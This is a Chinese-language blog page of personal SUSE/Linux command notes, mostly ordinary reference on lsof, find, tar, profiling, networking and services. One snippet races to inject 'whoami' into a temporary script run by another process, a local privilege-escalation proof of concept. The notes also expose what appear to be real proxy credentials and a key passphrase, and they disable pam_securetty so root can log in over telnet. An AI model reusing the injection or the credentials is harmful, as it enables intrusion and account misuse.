suse
suse笔记

top内存排序
执行top以后，在控制台执行shift + M


解压tar.gz文件
tar xzvf aa.tar.gz

压缩tar.gz文件
tar czvf aa.tar.gz *

nm的-o参数可以把文件名显示出来
nm -o *|grep iMAP

查看环境变量
env

查看cpu信息
cat /proc/cpuinfo

查看内存总量
grep MemTotal /proc/meminfo

查看空闲内存量
grep MemFree /proc/meminfo 

iptables -L # 查看防火墙设置

netstat -s # 查看网络统计信息

netstat -antp # 查看所有已经建立的连接

netstat -lntp # 查看所有监听端口

chkconfig --list # 列出所有系统服务

rpm -qa # 查看所有安装的软件包

pushd .
将当前目录压入栈，以后你可以使用popd回到此目录

tar -c dir/ | bzip2 > dir.tar.bz2
将目录dir/压缩打包

rsync --bwlimit=1000 fromfile tofile
有速度限制的本地拷贝，对I/O有利

ethtool --change eth0 autoneg off speed 100 duplex full
手动设制网卡速度


ip route show
显示路由列表

ip route add default via 1.2.3.254
设置默认网关1.2.3.254

netstat -tup
列出活跃的连接

ls -lSr
按文件大小降序显示文件

=====
查看某个端口被哪个进程占用了
lsof -i :31007

显示指定目录下的文件被哪些进程打开了
lsof +d /opt/iMAP/lib/
lsof +D /opt/iMAP/lib/ --递推搜索

显示使用fd为4的进程
lsof -d 4

看进程号为12的进程打开了哪些文件 
lsof -p 12 

间隔1秒查看进程的打开的文件
lsof +r 1 -c imapsysd

列出打开文件的大小
lsof -s -c imapsysd

-a与操作的用法，ipv4而且是imapsysd
lsof -i 4 -a -c imapsysd

列出打开的所有网络端口信息
lsof -i -U

查看多个进程的信息
lsof -p 456,123,789 

lsof -p $$

lsof -p 34654|grep 31050
=====/

ps -e -o pid,args --forest
以树状结构显示进程

ps -e -o pcpu,cpu,nice,state,cputime,args --sort pcpu | sed '/^ 0.0 /d'
以CPU占用率为序显示进程

ps -e -orss=,pid=,args= | sort -b -k1,1n | pr -TW$COLUMNS
以内存使用量为序显示进程

touch -c -t 0304050607 file
改变文件的时间标签 (YYMMDDhhmm)



strace -e open ls

linux上完整的errno
cat /usr/include/asm-generic/errno.h

查看支持哪些字符集
locale -a

linux源代码
/usr/src/linux-2.6.16.46-0.12

suse开启ssh服务步骤
yast2->用户管理->开启ssh服务
可能还要关闭防火墙

suse要想使用静态ip上网，还要设置命名服务器ip和路由ip都是192.168.1.1
还要把瑞星的防火墙保护关掉

开启samba在yast2中选择要smaba的目录即可

objdump -d a.out --反汇编
objdump -x obj 以某种分类信息的形式把目标文件的数据组织（被分为几大块）输出
objdump -t obj 输出目标文件的符号表

=====
用gcov来测试代码覆盖率 
1、编译链接增加 -fprofile-arcs -ftest-coverage
2、运行
3、gcov main.c
4、查看文件 main.c.gcov
(注意：程序必须正常退出才可以，如果中途coredump或者exit是不能生成报告的)

例子：
cd /opt/gcf/test/gcov/src
mwc
mke

lcov -d ./ -c -o ../temp/test_baseline.info -I

./testall

lcov -d ./ -c -o ../temp/test_current.info

lcov -a ../temp/test_baseline.info -a ../temp/test_current.info -o ../temp/test.info

genhtml --legend -k -s -o ../report/ ../temp/test.info
=====

stat file查看文件的状态，包括创建时间


md5sum 获取文件的md5值---md5可以理解为文件的指纹，是唯一的

cut -d: -f1 /etc/passwd > /tmp/zieckey_usr.txt 

过file指令，我们得以辨识该文件的类型

paste names places dates > npd

split切割文件

使用touch指令可更改文件或目录的日期时间，包括存取时间和更改时间

uniq可检查文本文件中重复出现的行列，可以打印重复的次数

netcat功能很强大

vlock锁定虚拟终端

把根目录换成指定的目的目录

vi打开文件后会产生一个临时的文件
如/etc/.passwd.swp

检测cpu型号 cat /proc/cpuinfo

gprof（linux，solaris）可进行性能分析，分析函数调用关系，编译和链接都要加-pg
然后gprof a.out 注意这个要先执行，，才能执行下面的
gprof -b ./a.out ./gmon.out
gprof -bC -f _Z5funcav ./a.out ./gmon.out 只关注funca函数
参数-E Name 计算中时间排除了Name及其字函数所用的时间

gprof只能查看用户函数，
如果想查看库函数的信息，需要在编译是再加入“-lc_p”编译参数代替“-lc”编译参数

希望find时忽略某个目录
find /apps -name "/apps/bin" -prune -o -print

指定时间创建文件(在find命令的时候可以用到)
touch -t 08050102 dstamp
find . -newer dstamp -print

查找除目录以为的所有类型的文件
find . ! -type d -print

查找文件并删除
find logs -type f -mtime +5 -exec rm {} \;

执行命令前有提示
find ./ -name "*.o" -mtime +5 -ok rm{} \;

查找1天内修改过的文件
find . -mtime -1

查找1天前修改过的文件
find . -mtime +1

找出空目录
find /path -depth -type d -empty

找字节为0的文件
find /path -depth -type f -empty

找出并删除文件
find /path -name "core.*" -type f -print | xargs /bin/rm -f

将xml，conf后缀文件列表保存的两个独立文件中
find ./ -name "*.xml" -fprintf xmlfiles.txt "%p\n" , -name "*.conf" -fprintf cfg.txt "%p\n"

将匹配到的文件以ls -l的形式显示出来 （-fls输出到文件）
find ./ -name "*.c" -ls

只搜索第2层的文件
find ./ -maxdepth 2 -mindepth 2 -name "*.xml"

查找大于10M的文件
find ./ -size +10M

-amin n
查找系统中最后N分钟访问的文件

-atime n
查找系统中最后n*24小时访问的文件

-cmin n
查找系统中最后N分钟被改变文件状态的文件

-ctime n
查找系统中最后n*24小时被改变文件状态的文件

-mmin n
查找系统中最后N分钟被改变文件数据的文件

-mtime n
查找系统中最后n*24小时被改变文件数据的文件

man的时候可以按P 回到开始

Linux内核源代码中绝大部分是设备驱动程序

关机命令
shutdown -h 0

ctrl + c不能退出，可以尝试ctrl + z

shell快捷键
atl + f 向前跳转到下一个字的第一个字符
atl + b 向后跳转到下一个字的第一个字符
atl + d 删除从光标当前位置，到当前字的结尾字符
ctrl + k 从光标当前位置删除所有字符至行尾
ctrl + w 向后删除一个字，用来对付刚刚输入的错误字很有用
atl u 单词变大写
alt t 交换单词

bind -P 查看所有的键盘绑定

lsof
查看谁在使用文件系统
lsof /opt/gcf

如果还有进程使用文件，即使这个文件被误删了，也可以将其恢复
# lsof |grep /var/log/messages
syslogd 1283 root 2w REG 3,3 5381017 1773647 /var/log/messages (deleted)
cat /proc/1283/fd/2 > /var/log/messages 

lsof -i :21 查看21端口现在运行什么程序

lsof +d /usr/local/ >显示目录下被进程开启的文件


lsof -c vi 显示进程vi打开的文件

lsof -d 4 显示使用fd为4的进程

lsof -r 2 /opt/gcf 每2秒执行一次

lsof -p 12 看进程号为12的进程打开了哪些文件

strace常用：
-s strsize --指定输出字符串最大长度

ltrace
ltrace -e fclose -l/lib/libc.so.6 ls

安装telnet服务：
yast2 inetd
选择Enable ，选择telnet，选择Edit
开启防火墙23端口
yast2 firewall
选择Allowed Services
选择Remote Access to Display Manager ，选择Advanced
在TCP Ports中输入23
重启机器

检查telnet是否安装
chkconfig -list|grep telnet

telnet服务对应的进程
/usr/sbin/xinetd

telnet使root可以直接登录，注释行
cat /etc/pam.d/login
#auth required pam_securetty.so

nm -l a.out --列出符号对应的行

tar指定解压目录
tar xvfz file.tar.gz -C /tmp

suse：
gunzip -dc gcf.tar.gz |tar -xv --一步解压tar.gz格式
tar xzvf gcf.tar.gz --或者这个命令
tar -ztvf gcf.tar.gz --查看tar.gz有什么文件
grep "abc" `tar tf gcf.tar` --在tar包中搜索包含abc的文件
grep "abc" `tar tzf gcf.tar.gz` ----在tar.gz包中搜索包含abc的文件
tar xvf gcf.tar gcf/aa.txt --只解压一个文件
gunzip -dc gcf.tar.gz | tar xf - gcf/aa.txt --只解压一个文件
tar -zxvpf /tmp/etc.tar.gz /etc -- p选项保留原文件的属性
tar zcvf gcf.tar.gz gcf --一次性压缩成tar.gz格式
tar -cvf gcf.tar gcf/*.cpp --压缩所有的cpp文件
tar -xvf gcf.tar *.txt 将所有的txt文件解压出来
tar -cvf gcf.tar --exclude gcf/*.txt gcf --排除所有*.txt文件
tar -rvf gcf.tar gcf/aa.txt --将文件追加到压缩包里
tar -cvf gcf.tar -T filelist --压缩filelist中配置的文件，不能有空行

solaris：
gtar zxvf gcf.tar.gz --一步解压tar.gz格式
gtar ztvf gcf.tar.gz --查看tar.gz有什么文件
gtar zxvf gcf.tar.gz gcf/aa.txt --只解压一个文件
grep "abc" `gtar zxvf gcf.tar.gz` ----在tar.gz包中搜索包含abc的文件
gtar zcvf gcf.tar.gz gcf --一次性压缩成tar.gz格式

ls按文件大小排序
ls -Sl

获取运行中进程的环境变量
vi /proc/2826/environ

获取当前shell的所有环境变量
env

Linux系统全局句柄限制
cat /proc/sys/fs/file-max

创建一个100M的空文件
dd if=/dev/zero of=hello.txt bs=100M count=1

=====
启动smba服务：
>> smbd
>> nmbd

停止服务：
>> pkill smbd
>> pkill nmbd

添加samba用户：
>> smbpasswd -a [USERNAME]
注：使用修改密码命令，即可新增SAMBA用户
=====/

启动sftp服务
cd /etc/rc.d/
./pure-ftpd start
ssh-keygen -t rsa
cd /root/.ssh
cat id_rsa.pub > authorized_keys

sftp配置文件
/etc/pure-ftpd/pure-ftpd.conf

valgrind内存检查工具


在安装盘里面修改/etc/security/limits.conf,加上imapuser hard nofile 10240，
主要目的是放大imapuser的硬限制的句柄，可以在安装盘里面执行改脚本
echo -ne "\nimapuser hard nofile 10240" >> /etc/security/limits.conf

也可以显示端口被哪个进程占用
lsof -i:31032

抓包,抓指定端口，指定ip
tcpdump port 5222 and host 10.71.158.51 -w tcpdump.cap

tcpdump可以抓取本地发给本地的网络包命令如下
tcpdump -i lo


创建文件，将启挂到一个目录上
#创建一个10M的文件，名字是foobar: 
# dd if=/dev/zero of=/home/foobar bs=1K count=10000 
(2)将这个文件格式化: 
# mke2fs -vFm0 /home/foobar 100000000 //(1K * 10000) 
mkdir /mnt/mountpoint
(3)将这个文件mount，之后就可以向这个文件中写内容了，就好比向一个目录中写内容一样： 
# mount -o loop home/foobar /mnt/mountpoint 


zgrep在tar.gz文件中搜索文本(solaris是gzcat命令)
zgrep insert iMAP.swm_agent.trace.*

以树形方式查看系统进程
pstree -aclp


scp CdnCMService*.xml 10.71.158.101:/opt/iMAP/etc/conf/

参考内存占用free -m|-g|-k


可以先用rpm -q 'xxx' 或者 rpm -qf 'xxx/bin/xxxx.xx' 来查询一下所属的rpm包的名字。
然后用rpm -e 'xxxxxx' 来删之。

suse通过yast2修改网卡为支持ipv6的步骤
yast2->网络设备->网卡->通过ifup的传统方法->下一步->选中网卡->编辑->地址->高级->启用ipv6->下一步

linux增加2G的swap分区.
dd if=/dev/zero of=/ex_swap bs=1024 count=2000000 创建2G的一个设备文件
mkswap /ex_swap 创建交换分区
swapon /ex_swap 激活交还分区

改时间
date 061717152008 月日时间年

linux下设置core 
/sbin/sysctl -w kernel.core_pattern=$IMAP_ROOT/var/logs/core.%e.%p
ulimit -c unlimited

linux共享内存函数 shmget

查看系统的共享内存信息
ipcs -l

设置浮动ip
ifconfig bond0:0 10.75.125.238 netmask 255.255.255.0

利用 Python 搭建一个简单的 Web 服务器，可通过 http://$HOSTNAME:8000 访问。 
python -m SimpleHTTPServer

linux上配置随机端口的文件（会影响监听端口被占用）
/etc/sysctl.conf
net.ipv4.ip_local_port_range=32768 65000

限制进程数：（会影响spawn线程）
/etc/security/limits.conf
* hard nproc 1000

LD_LIBRARY_PATH如果包含文件路径，则后续的路径将被忽略（会导致库找不到）；solaris无此问题

strace跟踪文件读写
strace -o trc -e write=16 -e read=16 -ff eam_initdata

获取源代码与汇编的对应关系
# g++ -g -o test test.cpp
# objdump -Sd test

LD_PRELOAD的功能是优先加载自定义的库，
目的是使用自定义的库符号替换原符号

LD_DEBUG可以看到运行时加载信息
export LD_DEBUG=help ls --显示帮忙

pmap最后一列MAPPING中标志说明：
a) [heap]标识：进程使用new/malloc分配的小于128字节的内存空间，一个进程只有一个START地址对应
b) [anon]标识：进程使用new/malloc分配的大于128直接的内存空间，一个进程有多个SRART地址对应 
c) [heap]和[anon]连同[stack][vdso]地址都属于进程私有内存。
d）/SYSV******** 标识的是共享内存,8位*是共享内存的basekey。
e）其他为具体映射的文件名。

root的profile文件：
/etc/profile

定时执行命令观察结果：
watch daem_ps

搜集内核堆栈：
echo t > /proc/sysrq-trigger 
然后信息保存在
/var/log/messages


查硬盘空间占用率
du --max-depth=1 -hl

linux 不用解压，搜索所有日志压缩文件文件的命令：
find ./ -name "*.zip"|xargs -t -I{} unzip -p {}|grep ProductCacheUptTask

在jar包中指定后缀名搜索关键字
find ./ -name "*.jar"|xargs -t -I{} unzip -C -p {} "*.xml"|grep plugins

搜索某个文件在哪个zip包里
find ./ -name "*zip"|xargs -t -I{} unzip -l {}|grep pagenation.ftl


解压指定类习惯的文件到指定目录
unzip /media//music.zip "*/*.mp3" -d /home/myhome/tmp


linux上跑svn
export LANG=zh_CN.UTF-8 否则无法下载中文文件


xshell自动输入密码的方法：
File->Properties->Connection->Authentication
Method:Public Key
User Name: root
User Key: Browse->Generate->Next->Next
Passphrase: huawei
Confirmation: huawei
->Next->Save as a file...
将刚才生成的文件内容追加到这个文件后面：
/root/.ssh/authorized_keys （如果没有这个文件，先创建一个空的文件）

查看文件被哪个进程使用：
lsof|grep iEMP

硬盘读写测试
hdparm -tT /dev/sda

可视化比较工具
vimdiff ---退出输入 :qa

svn使用vmdiff比较工具要封装一次vimdiff：
#!/bin/sh
shift 5
vimdiff "$@"

svn指定比较工具：
svn di --diff-cmd /opt/gcf/tool/diffwrap.sh -r 85236:85235 http://10.72.16.78:6801/svn/CRDU_iEMP_SRS_SVN/iemp/branches/br_iEMPV1R1C00_CP5201/src/iemp-pkg/kernel-app/org.eclipse.jetty.osgi.boot/src/main/java/com/huawei/oms/osgi/jetty/internal/webapp/HostWarWebAppContext.java

按时间秒数获取多个堆栈：（jstack_1381282039.txt）
jstack 14127 > jstack_`date +%s`.txt


查看用户当前使用资源数
ps -efL|grep -w ossuser|wc -l

ulimit -u只是某个用户的限制数


linux 挂windows共享文件方法：
mount -t cifs -o username=g00247299 //10.66.90.53/kkkkk /mnt/gcf

查看suse版本：
cat /etc/SuSE-release 

代理上网：（172.19.6.47是proxy.huawei.com的IP）
export http_proxy=http://china\\g00247299:gcf.imap9@172.19.6.47:8080

其他：
export https_proxy= http://domain\\user:pwd@proxy_addr:port 
export ftp_proxy= http://domain\\user:pwd@proxy_addr:port 
export no_proxy=proxy_addr:port

比较两台机器时间差：
#!/bin/bash
ssh -l root 10.67.164.170 "date '+%m/%d/%y %H:%M:%S'"
date '+%m/%d/%y %H:%M:%S'

xmlwf检查xml文件格式是否正确
xmlwf file.xml


树形显示子进程
pstree -pa 2442

命令行测试网管是否登录成功
curl -k -d "username=admin&https://10.67.152.144:31943/authenticate.action

构造命令字符串再执行的命令command 或者exec -c
cmd="iemp ps"
command $cmd

linux后台比较两个目录差异
diff -q -r /opt/oss /opt/oss_bak

iptable增加转发
iptables -A PREROUTING -t nat -i $HYPERFOX_IFACE -p tcp --destination-port 31945 -j REDIRECT --to-port 10043

iptables删除转发
iptables -D PREROUTING -t nat -i $HYPERFOX_IFACE -p tcp --destination-port 31945 -j REDIRECT --to-port 10043

取消超时退出
export TMOUT=0

openssl启动服务端
openssl s_server -accept 2009 -key server.pem -cert server.pem

获取文件扩展名
ind ./ -type f|awk -F'.' '{print $NF}'

监控文件
inotifywait -rm --timefmt '%d/%m/%y %H:%M:%S' --format '%T %e %w%f' -e create /opt/oss
帮助：http://linux.die.net/man/1/inotifywait

监听并统计文件使用情况
inotifywatch -v -e access -e modify -t 120 -r /opt/oss

监听到文件变化后执行命令
inoticoming --foreground /opt/oss/envs/Product-OMPApp/OMPApp-2.2.50.001/temp/ cp /opt/oss/envs/Product-OMPApp/OMPApp-2.2.50.001/temp/{} /opt/gcf/temp/kkk \;

xtail命令（非自带）可以替代tail -f 解决文件被删除的问题

！！swatch类似tail，但是功能更强大，可以对匹配的字符串执行命令
swatch -c ./gcf.conf --tail-file=/opt/gcf/temp/gcf.txt
帮助：http://www.dillonhale.com/blog/linux-tutorials/swatch-tutorial-beginners/

查看系统glibc支持的版本
strings /lib64/libc.so.6 |grep GLIBC_

安装glibc：
在glibc源码目录建立构建目录，并cd进入构建目录
mkdir build
cd build 
（LD_LIBRARY_PATH变量不能包含./当前目录）
../configure --prefix=/opt/glibc-2.14 
export LD_LIBRARY_PATH=/opt/glibc-2.14/lib:$LD_LIBRARY_PATH 
（参看：http://blog.csdn.net/cpplang/article/details/8462768）
下载地址：http://mirror.bjtu.edu.cnglibc-2.14.tar.xz

chattr +i file.txt --使文件不被修改,root也不能修改
chattr -i file.txt --去掉上面的标志
lsattr查看文件属性

查看命令树形关系
ps axjf

查看临时文件的方法：
while [ 1 ]; do cat /tmp/dbusertmpscript-3001-execsql-redis.sh >
/tmp/watchme 2>>/dev/null; if [ -s /tmp/watchme ]; then break; fi;
done; cat /tmp/watchme; echo; rm /tmp/watchme

往临时脚本注入命令
while [ 1 ]; do cat /tmp/dbusertmpscript-3001-execsql-redis.sh
>/tmp/watchme 2>>/dev/null; if [ -s /tmp/watchme ]; then echo
";whoami > /tmp/ioactive_flag;chmod 666 /tmp/ioactive_flag" >>
/tmp/dbusertmpscript-3001-execsql-redis.sh; rm /tmp/watchme;
break; fi; done; sleep 1; cat /tmp/ioactive_flag


screen使用
1、直接输入screen启动一个screen窗口，要暂停可以输入ctrl+a d,退出exit
2、screen -list 查看有哪些screen
3、screen -r xxx切换到screen session

sshfs挂载远程文件
sshfs root@10.67.252.200:/opt/gcf /mnt
fusermount -u /mnt --解挂

shc可以将shell转化成可执行文件

multitail可同时tail多个文件，功能比tail强大
http://www.oschina.net/p/multitail/similar_projects
http://www.ubuntugeek.com/multitail-view-multiple-logfiles-windowed-on-console.html
--retry-all 参数：如果文件被删除也可以继续
--mergeall 所有文件合并一个文件

tmux #开启tmux
tmux ls #列出会话(tmux list-session )
tmux attach #Tmux重新连接到之前的窗口可使用
tmux attach -t session #进入某个会话
tmux -r #连接上次断开的session
tmux kill-session #关闭上次tmux打开窗口
tmux kill-server #关闭所有tmux打开窗口
http://blog.jobbole.com/87278/
http://blog.jobbole.com/87584/

包含大量内核级工具，包括类似extrace
https://github.com/brendangregg/perf-tools

过滤重复的命令
extrace -d |grep -v /opt/gcf/temp |sh my.sh
my.sh的内容为：
#!/bin/sh
if [ $# -gt 0 ];then
exec 0<$1;
#判断是否传入参数：文件名，如果传入，将该文件绑定到标准输入
fi
while read line
do

echo "$line"|grep -sq /opt/gcf/temp

if [ $? -eq 0 ]
then
continue
fi

str2=`echo $line | sed 's/[0-9]/0/g'|base64`
grep -sq "$str2" /opt/gcf/temp/extrace_tmp1.txt
if [ ! $? -eq 0 ]
then
echo "$line" | tee -a /opt/gcf/temp/exec.txt
echo "$str2" >> /opt/gcf/temp/extrace_tmp1.txt
else
echo "$line" > /opt/gcf/temp/extrace_tmp2.txt
fi
done<&0;
#通过标准输入循环读取内容
exec 0&-;
#解除标准输入绑定

新建一个swap分区
dd if=/dev/zero of=/home/swap-fs bs=1M count=512
mkswap /home/swap-fs
swapon /home/swap-fs
长时间使用写入/etc/fstab文件，内容
/home/swap-fs swap swap defaults 0 0



linux各种工具源码，比如bash
https://ftp.gnu.org/gnu/

目录对任意用户可写的有：
/dev/shm
/var/tmp
/tmp
/usr/src/packages/*
/tmp/.ICE-unix
/tmp/.X11-unix
/var/cache/fonts
/var/run/uscreens
/var/spool/mail
/var/tmp/vi.recover

help查看内置命令的帮助
help set

ps afx --按树形子进程展示

可指定搜索路径
updatedb --localpaths='/opt/gcf/unjar/deploy' --output=/opt/gcf/locate.db
locate -d /opt/gcf/locate.db Main.java

locate要拷贝到其他机器，需要拷贝如下文件(updatedb是脚本，可以改脚本里面的路径)
/usr/bin/locate
/usr/bin/updatedb
/usr/lib64/find/bigram
/usr/lib64/find/code
/usr/lib64/find/frcode

建立一个伪造的http服务端
socat TCP-LISTEN:80,reuseaddr stdout

本地端口转发（windows可用）
socat tcp-listen:5656,fork tcp:localhost:1337

socat windows版本
https://github.com/StudioEtrange/socat-windows

inotifywait执行报句柄错误的解决办法
sysctl -w fs.inotify.max_user_watches="99999999"

python websockt客户端
https://pypi.python.org/pypi/websocket-client

解锁用户
pam_tally2 -u root -r
分类：技术分享
评论
说出你的观点，参与评论吧!